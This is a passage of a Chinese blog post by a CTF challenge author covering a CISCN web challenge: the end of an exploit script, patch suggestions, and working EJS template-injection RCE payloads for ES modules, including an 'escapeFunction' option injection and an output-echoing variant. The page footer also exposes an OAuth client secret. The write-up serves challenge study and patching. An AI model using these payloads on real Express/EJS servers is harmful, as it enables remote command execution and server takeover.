</span></span><span class="line"><span class="cl">                <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;no-cors&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}).</span><span class="k">finally</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">fetch</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">endpoint</span><span class="si">}</span><span class="sb">/flag`</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;no-cors&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}).</span><span class="nx">then</span><span class="p">((</span><span class="nx">resp</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">((</span><span class="nx">flag</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">            <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><h2 id="patch">patch</h2>
<p>patch 部分就很简单了，比赛期间也基本是送分的存在。根据前面的分析，本题最主要的点是 ejs 的 rce，所以最直接能够想到的办法就是在 <code>index.cjs</code> 中对传入 <code>res.render()</code> 的参数进行限制：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="../assets/6979c68d3f4976b0d1bbd758ffc15bc4_MD5.png"
        data-srcset="../assets/6979c68d3f4976b0d1bbd758ffc15bc4_MD5.png, ../assets/6979c68d3f4976b0d1bbd758ffc15bc4_MD5.png 1.5x, ../assets/6979c68d3f4976b0d1bbd758ffc15bc4_MD5.png 2x"
        data-sizes="auto"
        alt="../assets/6979c68d3f4976b0d1bbd758ffc15bc4_MD5.png"
        title="render的patch示例" /></p>
<p>或者在 <code>ws.mjs</code> 的 <code>profilePayload</code> 中生成 token 时直接删掉 <code>payload</code> 的解构：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sed -i <span class="s1">&#39;/\.\.\.payload/d&#39;</span> /app/ws.mjs
</span></span></code></pre></div><h2 id="后记">后记</h2>
<h3 id="ejs-中使用-import-进行-rce">ejs 中使用 import 进行 rce</h3>
<p>其实在出题的时候曾经考虑过把 <code>index.js</code> 也弄成 esmodule 的形式，这样在 ejs render rce 的时候就不能用 <code>process.mainModule.constructor._load</code> 来获取 <code>child_process</code> 了，<code>require()</code> 也没了。</p>
<p>但是考虑到现在网上几乎所有的文章里面都是用的这种方法，而且师傅们在现场也不能查资料，调试起来或许会有些困难，于是就还是把 <code>index.js</code> 写成 commonjs 的形式了。</p>
<p>在这里顺便贴一下在 esmodule 下对 ejs 进行 rce 的 payload，其实大差不差：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">cp</span><span class="p">=&gt;</span><span class="nx">cp</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">execSync</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">exec</span><span class="p">=&gt;</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;calc&#39;</span><span class="p">))</span>
</span></span></code></pre></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="../assets/2082bab44bcd0fba675638a1b3451040_MD5.png"
        data-srcset="../assets/2082bab44bcd0fba675638a1b3451040_MD5.png, ../assets/2082bab44bcd0fba675638a1b3451040_MD5.png 1.5x, ../assets/2082bab44bcd0fba675638a1b3451040_MD5.png 2x"
        data-sizes="auto"
        alt="../assets/2082bab44bcd0fba675638a1b3451040_MD5.png"
        title="ejs esmodule rce" /></p>
<p>或者再加一个 <code>async</code> 的 opt：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;settings&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;view options&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;client&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;async&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;escapeFunction&#34;</span><span class="p">:</span> <span class="s2">&#34;0;const child_process = await import(&#39;child_process&#39;);return child_process.execSync(&#39;calc&#39;)&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="../assets/3695be87e3aba2242c0e150885985e9c_MD5.png"
        data-srcset="../assets/3695be87e3aba2242c0e150885985e9c_MD5.png, ../assets/3695be87e3aba2242c0e150885985e9c_MD5.png 1.5x, ../assets/3695be87e3aba2242c0e150885985e9c_MD5.png 2x"
        data-sizes="auto"
        alt="../assets/3695be87e3aba2242c0e150885985e9c_MD5.png"
        title="async rce" /></p>
<h3 id="ejs-带回显-rce">ejs 带回显 rce</h3>
<h4 id="commonjs">commonjs</h4>
<p>其实这道题我写的 exp 中的 payload 就是可以回显的：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="../assets/646391cb5616ed8b05faa13010055852_MD5.png"
        data-srcset="../assets/646391cb5616ed8b05faa13010055852_MD5.png, ../assets/646391cb5616ed8b05faa13010055852_MD5.png 1.5x, ../assets/646391cb5616ed8b05faa13010055852_MD5.png 2x"
        data-sizes="auto"
        alt="../assets/646391cb5616ed8b05faa13010055852_MD5.png"
        title="ejs commonjs 带回显 rce" /></p>
<p>我们可以看看 ejs 是怎么获取模板渲染结果的：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="../assets/15c231475d630ecea08bdc120ffcfd74_MD5.png"
        data-srcset="../assets/15c231475d630ecea08bdc120ffcfd74_MD5.png, ../assets/15c231475d630ecea08bdc120ffcfd74_MD5.png 1.5x, ../assets/15c231475d630ecea08bdc120ffcfd74_MD5.png 2x"
        data-sizes="auto"
        alt="../assets/15c231475d630ecea08bdc120ffcfd74_MD5.png"
        title="ejs 模板编译结果" /></p>
<p>可以看到它是将模板“编译”成 js 运行，得到结果后再输出的，在 26 行我们进行拼接之后就可以自己构造一个 return 然后自定义模板渲染的返回结果了。</p>
<h4 id="esmodule">esmodule</h4>
<p>由于 esmodule 的 rce 是使用 <code>import()</code> 实现的，而这是一个异步的函数，所以并不能跟上文的 commonjs 一样直接 return，哪怕在 ejs 的 option 中设置了 <code>async</code> 也不行，只会返回一个空的 json，原因在于 express 的 <code>response.js</code> 中的默认回调函数：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="../assets/371e1746014cf340b671909a1e9fd21c_MD5.png"
        data-srcset="../assets/371e1746014cf340b671909a1e9fd21c_MD5.png, ../assets/371e1746014cf340b671909a1e9fd21c_MD5.png 1.5x, ../assets/371e1746014cf340b671909a1e9fd21c_MD5.png 2x"
        data-sizes="auto"
        alt="../assets/371e1746014cf340b671909a1e9fd21c_MD5.png"
        title="express 中的默认回调" /></p>
<p>express 并没有考虑到异步的情况，async 函数返回的是一个 promise 对象，这里并没有 resolve 或者 await 来获取运行结果。如果在路由中不传入 callback 的话那就没有办法回显了。出于类似的原因，报错信息也不能被返回，所以也断掉了通过报错携带回显的道路。</p>
<p>经过一些寻找之后我并没有发现一个能够直接回显的方法，不过有权限的话还是可以通过写文件、反弹 shell 之类的方式来做。</p>
<blockquote>
<p>2023年6月26日下午补充</p>
</blockquote>
<p>经过一些更多的寻找之后，esmodule 下也能一次访问回显了：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="../assets/aeaa4c87f64ef63320795fffbb301577_MD5.png"
        data-srcset="../assets/aeaa4c87f64ef63320795fffbb301577_MD5.png, ../assets/aeaa4c87f64ef63320795fffbb301577_MD5.png 1.5x, ../assets/aeaa4c87f64ef63320795fffbb301577_MD5.png 2x"
        data-sizes="auto"
        alt="../assets/aeaa4c87f64ef63320795fffbb301577_MD5.png"
        title="esmodule 的带回显 ejs rce" /></p>
<p>talk is cheap，直接上代码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="mi">0</span><span class="p">;</span><span class="kr">import</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">cp</span><span class="p">=&gt;</span><span class="nx">cp</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">execSync</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">exec</span><span class="p">=&gt;{</span><span class="nx">__output</span><span class="o">=</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">=&gt;{</span><span class="nx">__output</span><span class="o">=</span><span class="nx">e</span><span class="p">.</span><span class="nx">toString</span><span class="p">()});</span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nx">__output</span><span class="p">)</span><span class="nx">process</span><span class="p">.</span><span class="nx">_tickCallback</span><span class="p">();</span><span class="k">return</span> <span class="nx">__output</span>
</span></span></code></pre></div><p>原理也很简单，就是同步阻塞等待异步结果，关键点在 <code>process._tickCallback();</code> 这一行，如果只写一个类似 <code>while(!__output) continue;</code> 之类的话就会一直停在这里，不太明白的师傅可以去深入了解以下 js 的 eventloop。</p>
<p>这个 <code>__output</code> 是后面 31 行定义的，由于变量提升这里也可以访问到，所以我直接就用了这个变量名（<del>能懒一点是一点</del> 精简 payload），当然也可以自己重新定义一个变量来存放运行结果。</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2023-06-26</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://kdxcxs.github.io/posts/wp/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" data-title="CISCN国赛东南赛区出题小记" data-hashtags="ctf,my-chals,ciscn,ejs"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://kdxcxs.github.io/posts/wp/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://kdxcxs.github.io/posts/wp/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" data-title="CISCN国赛东南赛区出题小记"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Reddit" data-sharer="reddit" data-url="https://kdxcxs.github.io/posts/wp/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://kdxcxs.github.io/posts/wp/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" data-title="CISCN国赛东南赛区出题小记"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://kdxcxs.github.io/posts/wp/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" data-title="CISCN国赛东南赛区出题小记"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">ctf</a>,&nbsp;<a href="/tags/my-chals/">my-chals</a>,&nbsp;<a href="/tags/ciscn/">ciscn</a>,&nbsp;<a href="/tags/ejs/">ejs</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/cyber-security/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E6%8B%BF%E4%B8%8B%E5%AE%9D%E5%A1%94/" class="prev" rel="prev" title="任意文件读拿下宝塔"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>任意文件读拿下宝塔</a></div>
</div>
<div id="comments"><div id="gitalk" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">kdxcxs</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script type="text/javascript" src="/lib/gitalk/gitalk.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{"gitalk":{"admin":["kdxcxs"],"clientID":"47d8cb8981fe47dc90a4","clientSecret":"b86af02914c7213e58c926a185bb4051e9f35760","id":"2023-06-26T09:09:47+08:00","owner":"kdxcxs","repo":"blog-comment","title":"CISCN国赛东南赛区出题小记"}},"lightgallery":true,"search":{"highlightTag":"em","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
